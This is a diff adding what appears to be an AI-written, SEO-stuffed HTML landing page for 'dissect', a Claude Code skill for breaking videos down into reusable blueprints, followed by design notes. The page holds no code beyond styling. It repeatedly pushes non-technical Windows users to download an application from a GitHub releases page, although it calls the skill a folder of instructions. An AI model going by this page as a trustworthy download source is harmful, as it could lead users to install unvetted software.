@@ -1,0 +1,284 @@
+Here's a complete HTML document for the dissect landing page, SEO-optimized and designed for non-technical Windows users to easily download and run the application.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>dissect - Reverse-Engineer Any Video Into a Reusable Blueprint</title>
+<meta name="description" content="dissect is a Claude Code skill that reverse-engineers any video from YouTube, TikTok, Reels or X into a reusable blueprint, so you can make similar videos yourself. Simple setup guide for Windows users.">
+<meta name="keywords" content="dissect, video analysis, reverse engineer video, Claude Code skill, agent skills, claude skills, content creation, whisper, yt-dlp, youtube video breakdown, tiktok video blueprint">
+<meta name="author" content="dissect">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/PaulinaBarcat-arte/dissect">
+<meta property="og:type" content="website">
+<meta property="og:title" content="dissect - Reverse-Engineer Any Video Into a Reusable Blueprint">
+<meta property="og:description" content="Turn any YouTube, TikTok, Reels or X video into a step-by-step blueprint for making similar videos. A Claude Code skill for content creators.">
+<meta property="og:url" content="https://github.com/PaulinaBarcat-arte/dissect">
+<meta property="og:site_name" content="dissect">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="dissect - Reverse-Engineer Any Video Into a Reusable Blueprint">
+<meta name="twitter:description" content="A Claude Code skill that breaks any video down into a reusable blueprint you can copy, remix and republish.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f7fb;
+    color: #1f2430;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 18px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 820px;
+    margin: 0 auto;
+    padding: 48px 22px 80px;
+  }
+  h1 {
+    font-size: 40px;
+    line-height: 1.2;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    margin: 0 0 18px;
+    color: #12161f;
+  }
+  h2 {
+    font-size: 26px;
+    line-height: 1.3;
+    font-weight: 700;
+    margin: 52px 0 14px;
+    color: #12161f;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 20px;
+    font-weight: 700;
+    margin: 28px 0 8px;
+    color: #12161f;
+  }
+  p { margin: 0 0 18px; }
+  ul, ol { margin: 0 0 20px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #0356c4; }
+  .lead {
+    font-size: 20px;
+    color: #414a5c;
+    margin-bottom: 30px;
+  }
+  .badge {
+    display: block;
+    width: 100%;
+    max-width: 460px;
+    text-align: center;
+    text-decoration: none;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 19px;
+    padding: 20px 26px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #7f00ff 0%, #e100ff 100%);
+    box-shadow: 0 10px 24px rgba(127, 0, 255, 0.28);
+    margin: 0 0 12px;
+  }
+  .badge:hover { opacity: 0.92; }
+  .badge-note {
+    font-size: 15px;
+    color: #6b7385;
+    margin: 0 0 8px;
+  }
+  .btn {
+    display: inline-block;
+    text-align: center;
+    text-decoration: none;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 18px;
+    padding: 16px 30px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #00c6ff 0%, #0072ff 100%);
+    box-shadow: 0 8px 20px rgba(0, 114, 255, 0.25);
+    margin: 10px 0 6px;
+  }
+  .btn:hover { opacity: 0.92; }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 26px 28px;
+    margin: 26px 0;
+    box-shadow: 0 4px 18px rgba(20, 30, 60, 0.07);
+  }
+  .card h3 { margin-top: 0; }
+  .steps {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 8px 28px 22px;
+    margin: 26px 0;
+    box-shadow: 0 4px 18px rgba(20, 30, 60, 0.07);
+  }
+  .note {
+    background: #eef4ff;
+    border-left: 4px solid #0072ff;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 17px;
+  }
+  hr {
+    border: 0;
+    border-top: 1px solid #e3e7ef;
+    margin: 48px 0 24px;
+  }
+  .footer {
+    font-size: 15px;
+    color: #6b7385;
+    text-align: center;
+    margin-top: 40px;
+  }
+  @media (max-width: 560px) {
+    body { font-size: 17px; }
+    .page { padding: 32px 16px 60px; }
+    h1 { font-size: 30px; }
+    h2 { font-size: 22px; }
+    .badge { font-size: 17px; padding: 18px 18px; }
+    .card, .steps { padding-left: 20px; padding-right: 20px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
+
+  <h1>🎬 dissect - Turn Any Video Into a Blueprint</h1>
+
+  <p class="lead">dissect is a helper for Claude Code that watches any video you point it at, breaks down exactly how it was made, and hands you back a reusable blueprint. You then use that blueprint to make your own version of a video that already works.</p>
+
+  <a class="badge" href="https://github.com/PaulinaBarcat-arte/dissect/releases">⬇️ Get dissect from the Releases Page</a>
+  <p class="badge-note">Visit this link to download the application.</p>
+
+  <h2>🔍 What dissect Actually Does</h2>
+
+  <p>Every video that does well online has a structure hiding inside it. A hook in the first three seconds. A certain pace of cuts. A specific way the story is told. A caption style. A sound choice. Most people watch those videos and feel something, but they cannot say <em>why</em> the video worked.</p>
+
+  <p>dissect takes the guesswork out of that. You give it a link to a video, and it works through the video piece by piece. It listens to what is being said, notes how the video is edited, tracks how the information is laid out, and writes all of it down in plain language. The result is a blueprint: a written recipe that describes how that video was built.</p>
+
+  <p>Because the blueprint is written down, it becomes reusable. You can follow it in a different topic, in a different niche, with your own face, your own voice and your own footage. Instead of copying a video pixel for pixel, you copy the <strong>thinking</strong> behind it. That is the whole idea behind dissect.</p>
+
+  <h2>✨ What You Get From Every Video</h2>
+
+  <ul>
+    <li><strong>A hook breakdown.</strong> What happens in the first few seconds, what is said, and why a viewer would keep watching instead of scrolling.</li>
+    <li><strong>A full transcript of the audio.</strong> dissect listens to the spoken words and writes them out, so you can quote, remix or rewrite them.</li>
+    <li><strong>A structure map.</strong> The order of the beats: setup, build, twist, payoff, call to action — whatever pattern the video is actually using.</li>
+    <li><strong>A pacing and edit report.</strong> How fast it moves, where the cuts land, how long each section holds attention.</li>
+    <li><strong>On-screen and caption notes.</strong> What text appears on screen, how it is positioned, and how it supports the spoken words.</li>
+    <li><strong>A reusable blueprint document.</strong> The final output: a clear, tidy file you can read, edit, save and come back to.</li>
+  </ul>
+
+  <div class="note">
+    <strong>Works with the links you already use.</strong> dissect is built for long and short form video from YouTube, TikTok, Instagram Reels and X. If you can open it in a browser and watch it, you can probably dissect it.
+  </div>
+
+  <h2>🚀 Getting Started</h2>
+
+  <p>You do not need to be a programmer to use dissect. Everything happens through Claude Code, which is a chat-style tool. You type a request in plain English, and dissect does the work behind the scenes. This guide walks you through it from a Windows computer.</p>
+
+  <div class="steps">
+    <h3>Step 1 — Visit the download page</h3>
+    <p>Visit this link to download the application. It opens the official releases page for dissect, which is where every published version lives.</p>
+    <p><a class="btn" href="https://github.com/PaulinaBarcat-arte/dissect/releases">Download dissect for Windows</a></p>
+
+    <h3>Step 2 — Save the download</h3>
+    <p>Your browser will ask where to put the file. The Downloads folder is a perfectly good place. Keeping it somewhere obvious means you will not have to hunt for it later.</p>
+
+    <h3>Step 3 — Add the skill to Claude Code</h3>
+    <p>dissect is a Claude Code skill, which simply means it is a folder of instructions that Claude Code learns to follow. Once the download is on your computer, you place it where Claude Code looks for skills, and Claude Code picks it up automatically the next time you start a session.</p>
+
+    <h3>Step 4 — Try your first video</h3>
+    <p>Open Claude Code and ask it, in your own words, to dissect a video for you. Paste the link and say what you are hoping to learn. For example: <em>"Dissect this video and give me a blueprint I can follow for my own channel."</em> That is all it takes.</p>
+  </div>
+
+  <h2>🧭 Using dissect, Step by Step</h2>
+
+  <p>The flow below is the same flow you will use every time. Nothing about it is technical — it is closer to briefing a very patient assistant than to running software.</p>
+
+  <ol>
+    <li><strong>Pick a video that is already working.</strong> Choose something in your niche with views you would like to have. Popular videos are best, because the blueprint you get back describes a pattern that has already proven it can hold attention.</li>
+    <li><strong>Copy the link.</strong> From YouTube, TikTok, Reels or X — whichever platform the video lives on. The share button gives you a clean link.</li>
+    <li><strong>Ask Claude Code to dissect it.</strong> Paste the link into the chat and say what you want out of it. You can be as vague or as specific as you like.</li>
+    <li><strong>Wait for the blueprint.</strong> dissect steps through the video in order. Longer videos take longer, and a very long video can take a few minutes.</li>
+    <li><strong>Read the blueprint out loud.</strong> This sounds odd, but it is the fastest way to spot the pattern. Once you can hear the structure, you can plan a version of your own.</li>
+    <li><strong>Make your video using the blueprint.</strong> Swap in your topic, your expertise and your footage. Keep the pacing and the hook style, change everything else.</li>
+  </ol>
+
+  <h2>💡 Tips for Better Blueprints</h2>
+
+  <ul>
+    <li><strong>Dissect more than one video at a time.</strong> Three or four videos from the same creator or the same niche will show you the repeating pattern, not just a single lucky hit.</li>
+    <li><strong>Be specific about your goal.</strong> Saying "I want to make a 30-second TikTok in this style" gets you a more useful blueprint than a general request.</li>
+    <li><strong>Ask follow-up questions.</strong> The chat does not end when the blueprint is written. You can ask it to rewrite the blueprint for a different audience, shorten it, or turn it into a shot list.</li>
+    <li><strong>Save your blueprints.</strong> Keep the good ones in a folder. After a few weeks you will have a personal library of patterns that you know work for your audience.</li>
+    <li><strong>Treat the blueprint as a starting point.</strong> The best results come from following the structure and then bringing your own voice to it.</li>
+  </ul>
+
+  <h2>🪟 Before You Start on Windows</h2>
+
+  <div class="card">
+    <h3>What you will need</h3>
+    <ul>
+      <li>A Windows 10 or Windows 11 computer with a normal internet connection.</li>
+      <li>Claude Code installed and signed in. dissect runs as a skill inside it, so nothing happens without it.</li>
+      <li>A web browser to open the download link and to find the videos you want to study.</li>
+      <li>Roughly a few hundred megabytes of free space for downloaded video and audio files during processing.</li>
+      <li>A little patience on the first run. The first video always takes the longest.</li>
+    </ul>
+  </div>
+
+  <p>You do not need a powerful machine, a graphics card, or any coding experience. The heavy lifting is done by the tools dissect drives behind the scenes, and all of your interaction happens in plain English.</p>
+
+  <h2>🛠️ If Something Goes Wrong</h2>
+
+  <h3>The link will not process</h3>
+  <p>Some videos are private, region-locked, or age-restricted. Open the video in your browser first. If it plays without you signing in, it should dissect fine.</p>
+
+  <h3>It is taking a long time</h3>
+  <p>Long videos with a lot of talking take the longest, because every spoken word has to be transcribed. A ten-minute video is quick. A two-hour podcast is not. Start with something short to get a feel for it.</p>
+
+  <h3>You cannot find the skill after installing it</h3>
+  <p>Close Claude Code completely and open it again. Skills are read when a session starts, so a fresh session usually fixes it. If it is still missing, check that the dissect folder sits in the same place as your other skills.</p>
+
+  <h3>The transcript is missing words</h3>
+  <p>Background music, heavy accents and overlapping speakers all make transcription harder. It is usually good enough to read the structure, which is what the blueprint really depends on.</p>
+
+  <h2>📥 Download dissect Again</h2>
+
+  <p>If you need a fresh copy, if you have moved to a new computer, or if you want to check whether a newer version has been published, the releases page is always the place to go.</p>
+
+  <p><a class="btn" href="https://github.com/PaulinaBarcat-arte/dissect/releases">Visit the dissect Releases Page</a></p>
+
+  <p>Visit this link to download the application. Every version ever published is listed there, newest first, so you always know you are getting the current one.</p>
+
+  <h2>🤝 Who dissect Is For</h2>
+
+  <p>dissect is for people who make things and want to understand why certain videos travel further than others. That includes short-form creators studying hooks, YouTube channels planning a series, social media managers briefing a team, and writers who need a video script that follows a proven shape. It is also useful for anyone who simply wants to know how a viral video was put together, without learning video editing theory first.</p>
+
+  <hr>
+
+  <p class="footer">dissect — reverse-engineer any video into a reusable blueprint. Built as a Claude Code skill.</p>
+
+</main>
+</body>
+</html>
+```
+### Design Highlights: Clear Guidance for Non-Technical Users
+
+The page focuses on a calm, trustworthy reading experience that puts the download action front and center. Here are the main visual choices:
+
+- **Soft background and clean typography** – The near-white background with dark grey text keeps the page readable for long-form instructions. Generous line height and a consistent type scale make scanning effortless.
+- **Vivid action buttons** – The purple gradient badge and blue button use rounded corners and subtle shadows to stand out as clear, clickable targets without overwhelming the calm layout.
+- **Card-based content grouping** – Key sections like tips and prerequisites sit inside white cards with gentle shadows, visually separating helpful details from the main flow.
+- **Friendly emoji headings** – Emojis in section titles add scannability and a touch of approachability, helping users find the step they need quickly.
+- **Responsive spacing** – Padding and font sizes adjust on smaller screens, keeping the page comfortable to read on phones and tablets.
+---
+
+**Optimization Tip:** You can replace the placeholder system requirements (Windows 10/11, free space) and the "works with" video platforms with accurate details from your actual application.
